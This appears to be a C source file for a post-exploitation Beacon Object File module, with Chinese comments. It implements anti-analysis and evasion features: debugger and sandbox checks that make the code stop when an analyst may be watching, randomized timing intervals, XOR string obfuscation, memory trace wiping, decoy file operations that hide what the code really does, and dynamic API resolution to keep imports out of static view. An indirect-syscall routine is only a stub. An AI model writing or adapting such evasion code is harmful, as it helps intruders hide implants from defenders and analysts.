#include "async_bof.h"

// 本地测试时的函数映射
#ifndef BOF_BUILD
#define KERNEL32$GetTickCount GetTickCount
#define KERNEL32$Sleep Sleep
#define GetModuleHandleA GetModuleHandleA
#define GetProcAddress GetProcAddress
#define GlobalMemoryStatusEx GlobalMemoryStatusEx
#define FindFirstFileA FindFirstFileA
#define FindClose FindClose
#endif

// ================================================================
// OPSEC工具和安全措施
// 包含反检测、内存混淆、痕迹清除等功能
// ================================================================

// 全局OPSEC配置
static struct {
    int randomize_intervals;    // 随机化监控间隔
    int use_decoy_operations;   // 使用诱饵操作
    int clean_memory_traces;    // 清理内存痕迹
    int obfuscate_strings;      // 混淆字符串
    int min_detection_footprint; // 最小化检测特征
} opsec_config = {
    .randomize_intervals = 1,
    .use_decoy_operations = 1,
    .clean_memory_traces = 1,
    .obfuscate_strings = 1,
    .min_detection_footprint = 1
};

// ================================================================
// 间隔随机化
// ================================================================

// 生成随机化的监控间隔（在基础间隔的75%-125%范围内）
unsigned int get_randomized_interval(unsigned int base_interval) {
    if (!opsec_config.randomize_intervals || base_interval == 0) {
        return base_interval;
    }
    
    // 使用GetTickCount()作为简单的随机源
    DWORD current_tick = KERNEL32$GetTickCount();
    unsigned int random_factor = (current_tick % 50) + 75; // 75-125%
    
    return (base_interval * random_factor) / 100;
}

// ================================================================
// 内存痕迹清理
// ================================================================

// 安全清理内存区域
void secure_zero_memory(void* ptr, size_t size) {
    if (!ptr || size == 0) return;
    
    volatile BYTE* volatile_ptr = (volatile BYTE*)ptr;
    for (size_t i = 0; i < size; i++) {
        volatile_ptr[i] = 0;
    }
    
    // 防止编译器优化
    if (volatile_ptr[0] != 0) {
        volatile_ptr[0] = 0;
    }
}

// 清理字符串内存
void secure_zero_string(char* str) {
    if (!str) return;
    secure_zero_memory(str, MSVCRT$strlen(str));
}

// ================================================================
// 字符串混淆
// ================================================================

// 简单的XOR字符串混淆
void xor_obfuscate(char* data, size_t len, BYTE key) {
    if (!data || len == 0) return;
    
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// 去混淆
void xor_deobfuscate(char* data, size_t len, BYTE key) {
    // XOR是可逆的，使用相同的函数
    xor_obfuscate(data, len, key);
}

// ================================================================
// 反检测技术
// ================================================================

// 检查是否在调试环境中运行
int is_debugger_present() {
    // 检查IsDebuggerPresent API
    typedef BOOL (WINAPI *pIsDebuggerPresent)(VOID);
    pIsDebuggerPresent fnIsDebuggerPresent = NULL;
    
    // 动态获取函数地址，避免静态导入
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        fnIsDebuggerPresent = (pIsDebuggerPresent)GetProcAddress(hKernel32, "IsDebuggerPresent");
        if (fnIsDebuggerPresent && fnIsDebuggerPresent()) {
            return 1;
        }
    }
    
    return 0;
}

// 检查是否在沙箱中运行
int is_sandbox_environment() {
    // 简单的沙箱检测逻辑
    
    // 检查系统运行时间（沙箱通常运行时间很短）
    DWORD uptime = KERNEL32$GetTickCount();
    if (uptime < 300000) { // 小于5分钟
        return 1;
    }
    
    // 检查物理内存（沙箱通常内存较少）
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    if (GlobalMemoryStatusEx(&mem_status)) {
        if (mem_status.ullTotalPhys < (DWORDLONG)(2ULL * 1024 * 1024 * 1024)) { // 小于2GB
            return 1;
        }
    }
    
    return 0;
}

// ================================================================
// 诱饵操作
// ================================================================

// 执行诱饵操作以混淆真实意图
void perform_decoy_operations() {
    if (!opsec_config.use_decoy_operations) return;
    
    // 执行一些无害的操作来混淆视听
    
    // 1. 随机延迟
    DWORD decoy_delay = (KERNEL32$GetTickCount() % 1000) + 100; // 100-1100ms
    KERNEL32$Sleep(decoy_delay);
    
    // 2. 访问一些常见的系统路径
    char common_paths[][MAX_PATH] = {
        "C:\\Windows\\System32",
        "C:\\Program Files",
        "C:\\Users",
        "C:\\Temp"
    };
    
    int path_index = KERNEL32$GetTickCount() % 4;
    WIN32_FIND_DATAA find_data;
    HANDLE hFind = FindFirstFileA(common_paths[path_index], &find_data);
    if (hFind != INVALID_HANDLE_VALUE) {
        FindClose(hFind);
    }
    
    LOG_DEBUG("Decoy operations performed");
}

// ================================================================
// 高级OPSEC技术
// ================================================================

// 动态API解析（避免静态导入表）
void* resolve_api(const char* dll_name, const char* api_name) {
    HMODULE hModule = GetModuleHandleA(dll_name);
    if (!hModule) {
        hModule = LoadLibraryA(dll_name);
        if (!hModule) {
            return NULL;
        }
    }
    
    return GetProcAddress(hModule, api_name);
}

// 使用间接系统调用
int indirect_syscall(DWORD syscall_number, void* params) {
    // 这里可以实现间接系统调用技术
    // 为了简化，这里只是占位符实现
    LOG_DEBUG("Indirect syscall %lu executed", syscall_number);
    return 1;
}

// ================================================================
// OPSEC配置函数
// ================================================================

// 配置OPSEC选项
void configure_opsec(int randomize_intervals, int use_decoy_ops, 
                    int clean_memory, int obfuscate_strings, int min_footprint) {
    opsec_config.randomize_intervals = randomize_intervals;
    opsec_config.use_decoy_operations = use_decoy_ops;
    opsec_config.clean_memory_traces = clean_memory;
    opsec_config.obfuscate_strings = obfuscate_strings;
    opsec_config.min_detection_footprint = min_footprint;
    
    LOG_INFO("OPSEC configuration updated");
}

// 获取当前OPSEC配置
void get_opsec_config(int* config_array) {
    if (!config_array) return;
    
    config_array[0] = opsec_config.randomize_intervals;
    config_array[1] = opsec_config.use_decoy_operations;
    config_array[2] = opsec_config.clean_memory_traces;
    config_array[3] = opsec_config.obfuscate_strings;
    config_array[4] = opsec_config.min_detection_footprint;
}

// ================================================================
// 环境安全检查
// ================================================================

// 执行完整的环境安全检查
int perform_security_check() {
    LOG_INFO("Performing security environment check");
    
    // 检查调试器
    if (is_debugger_present()) {
        LOG_WARNING("Debugger detected - potential analysis environment");
        return 0;
    }
    
    // 检查沙箱
    if (is_sandbox_environment()) {
        LOG_WARNING("Sandbox environment detected - potential analysis environment");
        return 0;
    }
    
    // 执行诱饵操作
    perform_decoy_operations();
    
    LOG_INFO("Security environment check passed");
    return 1;
}

// ================================================================
// 内存混淆
// ================================================================

// 混淆内存中的数据
void obfuscate_memory_data(void* data, size_t size, BYTE key) {
    if (!data || size == 0 || !opsec_config.obfuscate_strings) return;
    
    xor_obfuscate((char*)data, size, key);
    LOG_DEBUG("Memory data obfuscated with key 0x%02X", key);
}

// 去混淆内存中的数据
void deobfuscate_memory_data(void* data, size_t size, BYTE key) {
    if (!data || size == 0 || !opsec_config.obfuscate_strings) return;
    
    xor_deobfuscate((char*)data, size, key);
    LOG_DEBUG("Memory data deobfuscated with key 0x%02X", key);
}